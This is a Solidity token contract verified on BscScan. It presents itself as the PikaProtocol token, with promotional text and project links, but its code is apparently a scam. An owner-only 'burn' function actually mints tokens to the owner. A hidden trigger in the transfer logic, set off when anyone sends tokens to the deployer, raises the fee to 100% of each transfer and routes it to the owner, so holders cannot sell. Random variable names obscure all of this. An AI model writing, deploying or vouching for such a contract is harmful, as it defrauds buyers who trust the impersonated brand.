/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

/*
PikaProtocol
Decentralized leverage trading on Optimism, up to 100x leverage on crypto and forex with low slippage
We are excited to announce Pika V3 is live on optimismFND
mainnet today!
https://link.medium.com/02GRklVrYrb 
What's new in Pika v3? 
https://discord.gg/ueEe398UWt
https://linktr.ee/pikaprotocol
https://pikaprotocol.com
https://twitter.com/PikaProtocol
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.4;
contract PikaProtocol {
uint8 public constant decimals = 18;
address public  gvmrUF = address(0);
uint256 public  kdmgwi = 100000000000000000000;
uint256 public  ycyvpe = 100000000000000000;
string public  name = "PikaProtocol";
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  rCisBD = address(0);
address public  GmyvZc = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  BDSusw = 10000000000000000000000000000;
address public  nEuysh = address(0);
mapping (address => uint256) public balanceOf;
uint256 public constant xaGkFk = 9+1;
address private  QBPTAk = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address public  sJMyMO = address(0);
string public  symbol = "PikaProtocol";
uint256 public  sliQVq = 10000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  QHszNq = 1000000000000000000;
uint256 public  yxnGSj = 100000000000000000000000;
uint256 public  bhZcZO = 100000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
uint256 private  drvqyC = 10000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  qatdZK = 10000000000000000000;
address public  PDFSmB = address(0);
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ipckji");
require(to != address(0), "ipckji");
require(amount <= balanceOf[from], "ipckji");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* xaGkFk/drvqyC ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==QBPTAk){
drvqyC = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () {
QBPTAk = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}